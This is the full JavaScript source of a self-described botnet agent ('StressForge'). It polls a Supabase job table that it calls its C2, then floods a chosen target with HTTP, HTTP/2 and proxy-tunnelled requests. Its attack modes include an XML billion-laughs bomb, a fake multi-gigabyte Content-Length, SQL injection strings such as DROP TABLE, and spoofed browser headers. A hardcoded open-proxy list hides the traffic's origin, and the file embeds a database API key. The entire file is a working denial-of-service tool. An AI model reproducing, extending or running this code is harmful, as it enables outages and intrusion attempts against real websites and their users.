/**
 * STRESSFORGE BOTNET AGENT V9.2 (STABILITY UPDATE)
 * - Fix: Database Write Reliability
 * - Fix: Latency Calculation Logic
 * - Host: Render/Railway Free Tier Optimized
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
const MAX_SAFE_CONCURRENCY = 2500; 

// --- ASSETS ---
const PROXY_LIST = [
    '104.16.148.244:80', '188.166.204.43:8080', '45.167.124.5:999', '103.152.112.162:80',
    '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
];
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
];
const REFERERS = ["https://google.com", "https://bing.com", "https://twitter.com", "https://facebook.com"];
const JUNK_DATA = 'x'.repeat(1024 * 10); 
const XML_BOMB = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>';
const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TABLE users; --", "admin' --"];

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V9.2 ACTIVE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: NATIVE SUPABASE ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[35m[AGENT] Initialized V9.2. Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

const startAttack = (job) => {
    if (activeJob) return;
    if (job.concurrency > MAX_SAFE_CONCURRENCY) job.concurrency = MAX_SAFE_CONCURRENCY;

    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | T: ${job.concurrency} | D: ${duration}s\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    
    const startTime = Date.now();
    let targetUrl;
    try { targetUrl = new URL(job.target); } catch(e) { return; }
    
    // HTTP/2 SESSION (Turbo)
    let h2Session = null;
    if (job.use_http2 && targetUrl.protocol === 'https:' && !job.use_ghost_proxy) {
        try {
            h2Session = http2.connect(targetUrl.origin);
            h2Session.on('error', () => { h2Session = null; });
        } catch(e) {}
    }

    const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
    let baseHeaders = job.headers || {};
    if (typeof baseHeaders === 'string') { try { baseHeaders = JSON.parse(baseHeaders); } catch(e) { baseHeaders = {}; } }

    const performRequest = () => {
        if (!running) return;
        
        // --- 1. HEADER MIMICRY ---
        const currentHeaders = { ...baseHeaders };
        currentHeaders['Accept-Encoding'] = 'gzip, deflate, br';
        currentHeaders['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        currentHeaders['Upgrade-Insecure-Requests'] = '1';

        // --- 2. PAYLOAD CONSTRUCTION ---
        let payload = job.body;
        if (job.use_xml_bomb) {
            payload = XML_BOMB;
            currentHeaders['Content-Type'] = 'application/xml';
        } else if (job.use_goldeneye) {
            currentHeaders['X-Heavy-Load'] = 'true';
            payload = JUNK_DATA;
        } else if (job.use_big_bang) {
             currentHeaders['Content-Length'] = '10737418240'; 
        }

        // --- 3. SQL FLOOD ---
        let currentUrl = targetUrl.href;
        if (job.use_sql_flood) {
            const separator = currentUrl.includes('?') ? '&' : '?';
            const sql = SQL_PAYLOADS[Math.floor(Math.random() * SQL_PAYLOADS.length)];
            currentUrl += `${separator}q=${encodeURIComponent(sql)}`;
        }
        
        if (job.use_chaos) {
            const separator = currentUrl.includes('?') ? '&' : '?';
            currentUrl += `${separator}_vortex=${Math.random().toString(36).substring(2)}`;
            currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
            currentHeaders['Referer'] = REFERERS[Math.floor(Math.random() * REFERERS.length)];
        }

        // --- 4. PROXY SELECTION (GHOST MODE) ---
        let proxyOptions = null;
        if (job.use_ghost_proxy) {
            const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
            const [phost, pport] = proxy.split(':');
            proxyOptions = { host: phost, port: parseInt(pport) };
        }
        
        const vortexUrlObj = new URL(currentUrl);
        const start = Date.now();

        // --- 5. REQUEST EXECUTION ---
        const handleResponse = (res) => {
            const lat = Date.now() - start;
            jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
            if (res.statusCode >= 200 && res.statusCode < 400) jobSuccess++; else jobFailed++;
            if (res.resume) res.resume();
            totalRequests++;
            if (running && !job.use_pulse) setImmediate(performRequest);
        };

        const handleError = () => {
             jobFailed++; totalRequests++; 
             if (job.use_infinity && running) {
                 setImmediate(performRequest); setImmediate(performRequest); setImmediate(performRequest);
             } else if (running && !job.use_pulse) {
                 setImmediate(performRequest); 
             }
        };

        if (job.use_ghost_proxy && proxyOptions) {
             const tunnelReq = http.request({
                 host: proxyOptions.host,
                 port: proxyOptions.port,
                 method: 'CONNECT',
                 path: `${vortexUrlObj.hostname}:443`,
                 headers: { 'Proxy-Connection': 'Keep-Alive' }
             });
             tunnelReq.on('connect', (res, socket, head) => {
                 const secureSocket = tls.connect({ socket: socket, servername: vortexUrlObj.hostname, rejectUnauthorized: false }, () => {
                     const req = https.request({
                         host: vortexUrlObj.hostname,
                         path: vortexUrlObj.pathname + vortexUrlObj.search,
                         method: job.method || 'GET',
                         headers: currentHeaders,
                         createConnection: () => secureSocket
                     }, handleResponse);
                     req.on('error', handleError);
                     if (payload && !job.use_big_bang) req.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
                     if (!job.use_big_bang) req.end(); 
                 });
                 secureSocket.on('error', handleError);
             });
             tunnelReq.on('error', handleError);
             tunnelReq.end();
        } else if (job.use_http2 && h2Session && !h2Session.destroyed) {
            const req = h2Session.request({ ':path': vortexUrlObj.pathname + vortexUrlObj.search, ':method': job.method || 'GET', ...currentHeaders });
            req.on('response', (headers) => {
                const lat = Date.now() - start;
                jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                const status = headers[':status'] || 200;
                if (status >= 200 && status < 400) jobSuccess++; else jobFailed++;
                totalRequests++;
            });
            req.on('error', handleError);
            if (payload && !job.use_big_bang) req.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
            req.end();
            if (running && !job.use_pulse) setImmediate(performRequest);
        } else {
             const lib = vortexUrlObj.protocol === 'https:' ? https : http;
             const req = lib.request(vortexUrlObj, { agent, method: job.method || 'GET', headers: currentHeaders, timeout: 5000 }, handleResponse);
             req.on('socket', (s) => s.setNoDelay(true)); 
             req.on('error', handleError);
             if (payload && !job.use_big_bang) try { req.write(typeof payload === 'string' ? payload : JSON.stringify(payload)); } catch(e) {}
             if (!job.use_big_bang) req.end();
        }
    };

    if (job.use_pulse) {
        const pulseLoop = setInterval(() => { if (!running) return clearInterval(pulseLoop); for(let i=0; i<500; i++) performRequest(); }, 100);
    } else {
        for(let i=0; i<job.concurrency; i++) performRequest();
    }

    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        const used = process.memoryUsage().heapUsed / 1024 / 1024;
        if (used > 400 && global.gc) global.gc();

        try {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
                 current_rps: rps,
                 total_success: jobSuccess,
                 total_failed: jobFailed,
                 avg_latency: avgLat,
                 max_latency: jobMaxLatency 
             });
        } catch(e) { 
            console.log('[ERROR] DB Write Failed. Check Schema.');
        }

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            if (h2Session) h2Session.close();
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED', logs: 'Finished by Agent Timeout' });
            console.log('[COMPLETE] Attack finished.');
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
